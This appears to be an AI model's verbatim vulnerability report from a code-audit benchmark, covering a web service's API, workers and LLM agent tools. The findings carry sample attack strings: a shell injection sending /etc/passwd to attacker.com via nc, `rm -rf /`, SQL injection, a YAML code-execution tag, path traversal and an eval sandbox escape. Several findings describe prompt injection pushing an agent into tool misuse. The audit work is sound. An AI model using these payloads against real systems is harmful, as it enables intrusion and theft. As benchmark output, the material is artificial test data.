# Haiku 4.5 — region `services` (services/ + workers/) — verbatim report

Blind copy of 3ff7e43. Prompt: benchmarks/sweep_prompt.md v1, region `services`.

---

1. **Shell Injection in Retention Cleanup** (CRITICAL)
   - Entry point: `POST /api/datasets/<int:dataset_id>/schedule_cleanup` with `pattern` parameter
   - Path: api/datasets.py:137-138 -> enqueue() -> workers/tasks.py:87 -> services/retention.py:14-15
   - Dangerous operation: `f"rm -f {cleanup_dir}/{pattern}"` passed to `subprocess.Popen(cmd, shell=True)` in services/retention.py:14-15
   - Attack: Attacker sends pattern like `* ; nc attacker.com 1234 < /etc/passwd` to execute arbitrary shell commands
   - Impact: Remote code execution as the worker process user

2. **SQL Injection - Tag Parameter** (CRITICAL)
   - Entry point: `GET /api/experiments/search?tag=<value>`
   - Path: api/experiments.py:50 -> services/experiments.py:26
   - Dangerous operation: `f"tags LIKE '%{tag}%'"` directly interpolated into SQL query without escaping; line 34 executes via `db.session.execute(text(query))`
   - Attack: Attacker sends `tag=*' OR '1'='1` to bypass filtering or `tag=*' UNION SELECT ...` to extract data
   - Impact: Data exfiltration, authentication bypass

3. **SQL Injection - Sort Parameter** (CRITICAL)
   - Entry point: `GET /api/experiments/search?sort=<value>`
   - Path: api/experiments.py:51 -> services/experiments.py:32
   - Dangerous operation: `f"ORDER BY {sort} DESC"` directly interpolated into SQL query without validation or parameterization
   - Attack: Attacker sends `sort=(SELECT password FROM users LIMIT 1)--` or other SQL injection payloads
   - Impact: Data exfiltration, authentication bypass

4. **SQL Injection - Owner Parameter** (CRITICAL)
   - Entry point: `GET /api/experiments/count?owner=<value>`
   - Path: api/experiments.py:60 -> services/experiments.py:45
   - Dangerous operation: `f"SELECT COUNT(*) FROM experiments WHERE owner_id = {owner}"` directly interpolated without parameterization
   - Attack: Attacker sends `owner=1 OR 1=1` to bypass ownership checks
   - Impact: Data exfiltration, authorization bypass

5. **Unsafe YAML Deserialization - Pipeline Config** (CRITICAL)
   - Entry point: `POST /api/experiments` with `pipeline_config` in JSON body
   - Path: api/experiments.py:30 -> services/config_loader.py:20 uses `yaml.load(text, Loader=yaml.Loader)`
   - Dangerous operation: `yaml.Loader` allows arbitrary Python object deserialization
   - Attack: Attacker sends YAML like `!!python/object/apply:os.system ["id"]` to execute arbitrary code during deserialization
   - Impact: Remote code execution during pipeline config parsing

6. **Arbitrary Python Code Execution - Loader Script** (CRITICAL)
   - Entry point: `POST /api/datasets` with `loader_script` parameter
   - Path: api/datasets.py:29 (stored in Database) -> api/datasets.py:98 -> services/dataset.py:85
   - Dangerous operation: `exec(script_src, scope)` in dataset.py:85 executes untrusted Python code
   - Attack: Attacker provides `loader_script = "__import__('os').system('whoami')"`
   - Impact: Remote code execution with application privileges

7. **Arbitrary Python Code Execution - Model-Generated Analysis** (CRITICAL)
   - Entry point: `POST /api/datasets/<int:dataset_id>/analyze` with `question` parameter
   - Path: api/datasets.py:85 -> services/analysis.py:36
   - Dangerous operation: `exec(code, scope)` in analysis.py:36 executes LLM-generated code
   - Attack: User asks question that tricks LLM into generating code like `__import__('os').system('rm -rf /')`. Even with scope limiting, exec() has access to `__builtins__` which includes `__import__`
   - Impact: Remote code execution if LLM output can be influenced (prompt injection)

8. **Path Traversal - Custom Report Templates** (HIGH)
   - Entry point: `POST /api/reports/custom` with `template_name` parameter
   - Path: api/reports.py:77 -> services/reports.py:56 -> services/reports.py:37-38
   - Dangerous operation: `os.path.join(str(TEMPLATE_DIR), template_name)` followed by `open(path, "r")` with no path validation
   - Attack: Attacker sends `template_name=../../../etc/passwd` to read arbitrary files
   - Impact: Information disclosure (arbitrary file read)

9. **Path Traversal - Archive Extraction** (HIGH)
   - Entry point: `POST /api/datasets` with `archive_b64` parameter containing malicious zip/tar file
   - Path: api/datasets.py:45 -> services/dataset.py:13-47 (extract_archive function)
   - Dangerous operation: Line 26/36 uses `os.path.join(dest_str, member)` where member comes from archive; OS path resolution will interpret ".." and "/" sequences. Line 31-32 and 43-44 write to the resolved path without validation
   - Attack: Attacker uploads archive with member name `../../../etc/passwd` or `/etc/shadow` to write outside intended directory
   - Impact: Arbitrary file write, potential system compromise

10. **Unsafe Deserialization - jsonpickle** (HIGH)
    - Entry point: `POST /api/experiments/import` with `payload` parameter
    - Path: api/experiments.py:149 uses `jsonpickle.decode(data.get("payload", ""))`
    - Dangerous operation: jsonpickle can deserialize arbitrary Python objects with full code execution capability
    - Attack: Attacker sends crafted jsonpickle payload that reconstructs malicious objects with `__setstate__` or similar hooks
    - Impact: Remote code execution via deserialization

11. **Path Traversal - Artifact Storage** (HIGH)
    - Entry point: Model import via `/api/models/import` or similar endpoint that calls `save_with_metadata`
    - Path: services/registry.py:58-70 (save_with_metadata function)
    - Dangerous operation: Line 64-65 extracts `storage_path` from metadata dict without validation: `rel = meta.get("storage_path")` then `os.path.join(str(ARTIFACT_DIR), rel)`. If `rel` is an absolute path, os.path.join ignores ARTIFACT_DIR. If `rel` is `../../../etc/passwd`, it can traverse directories
    - Attack: Attacker provides metadata with `storage_path=/etc/passwd` or `storage_path=../../../etc/shadow` to write artifacts outside registry
    - Impact: Arbitrary file write, potential system compromise

12. **Path Traversal - read_raw Function** (MEDIUM)
    - Location: services/registry.py:34-41
    - Dangerous operation: `os.path.join(str(ARTIFACT_DIR), name)` with no sanitization. If name is an absolute path or contains "..", it can escape the ARTIFACT_DIR
    - Attack: Attacker calls with `name=/etc/passwd` (absolute path causes os.path.join to ignore ARTIFACT_DIR) or `name=../../sensitive_file`
    - Impact: Arbitrary file read from the system

13. **Unsafe SQL Tool - Information Disclosure** (HIGH)
    - Tool: `run_sql` in agent/tools.py:23-26
    - Dangerous operation: `db.session.execute(text(input))` executes arbitrary SQL
    - Attack: LLM can be tricked to call this tool with SQL injection payloads
    - Impact: Unauthorized data access if LLM can be manipulated via prompt injection

14. **Arbitrary File Read Tool - Path Traversal** (HIGH)
    - Tool: `read_file` in agent/tools.py:29-32
    - Dangerous operation: `open(input, "r")` with no path validation
    - Attack: LLM can be manipulated to call this tool with paths like `/etc/passwd` or `../../../credentials.json`
    - Impact: Information disclosure of sensitive files if LLM can be manipulated

15. **Server-Side Request Forgery Tool** (MEDIUM)
    - Tool: `http_get` in agent/tools.py:35-37
    - Dangerous operation: `requests.get(input, timeout=10)` makes HTTP request to arbitrary URL
    - Attack: LLM can be manipulated to make requests to internal services (localhost:8000, 169.254.169.254 for cloud metadata, etc.)
    - Impact: SSRF attacks to access internal services

16. **Unsafe Eval Tool** (MEDIUM)
    - Tool: `calc` in agent/tools.py:40-42
    - Dangerous operation: `eval(input, {"__builtins__": {}}, {})` executes arbitrary Python expressions
    - Attack: While __builtins__ is restricted, expressions like `().__class__.__bases__[0].__subclasses__()` can break out and achieve code execution
    - Impact: Potential code execution through eval sandbox escape

17. **Arbitrary Package Installation Tool** (MEDIUM)
    - Tool: `install_package` in agent/tools.py:62-82
    - Dangerous operation: `subprocess.run([sys.executable, "-m", "pip", "install", ..., name])` where name is from user input via LLM
    - Attack: LLM can be tricked to install malicious packages via dependency confusion or typosquatting
    - Impact: Remote code execution through pip package execution

18. **Host Validation Bypass in is_safe_url** (MEDIUM)
    - Location: core/security.py:166-177
    - Dangerous operation: `host.endswith(allowed)` for allowed host validation
    - Attack: If allowed hosts are `"example.com"`, attacker can register `"example.com.attacker.com"` domain, and `"example.com.attacker.com".endswith("example.com")` returns True, allowing SSRF to attacker-controlled server
    - Attack scenario: Dataset import with source_url to attacker server -> fetch() validates via is_safe_url and allows it -> attacker serves malicious pickle file -> workers/tasks.py:45 deserializes it with model_loader.load_model_bytes()
    - Impact: Server-side request forgery to attacker-controlled systems; combined with pickle deserialization, leads to RCE

---

## INSPECTED AND BELIEVED SAFE

- **markdown.py:25-60** (render_markdown and render_card_markdown): Markdown rendering with HTML escaping appears properly implemented for XSS prevention. Image/link filtering and HTML escaping with `escape(value, quote=True)` prevents attribute injection.
- **security.py password functions** (hash_password, verify_password): Uses PBKDF2 with proper salt and constant-time comparison via hmac.compare_digest. Cryptographically sound.
- **security.py token functions** (issue_token, decode_token, verify_edge_service_token): JWT token generation and verification follows standard practices with proper algorithm specification. Note: verify_service_token (line 62-72) intentionally skips signature verification for internal mesh traffic, which is correctly documented as network-local only.
- **security.py username validation** (validate_username, validate_username_bulk): Regex-based validation against alphanumeric and underscore appears adequate for preventing injection.
- **search_by_tag** (experiments.py:49-56): Uses parameterized query with `:tag` placeholder and passes tag as parameter, preventing SQL injection on this path.
- **ask_experiments_structured** (experiments.py:73-86): Constrains queries to allow-listed columns and uses parameterized `:value` placeholder, preventing SQL injection on this path.
- **registry functions with path validation** (registry.py:27-31, registry.py:44-55): download_artifact() and read_artifact() properly validate paths using realpath() and checking that resolved path stays within root directory.
- **models.py ORM**: SQLAlchemy ORM queries using parameterized operations (e.g., db.session.get by primary key) are safe from SQL injection.
- **auth.py and require_auth**: Token-based authentication with proper verification appears implemented correctly.
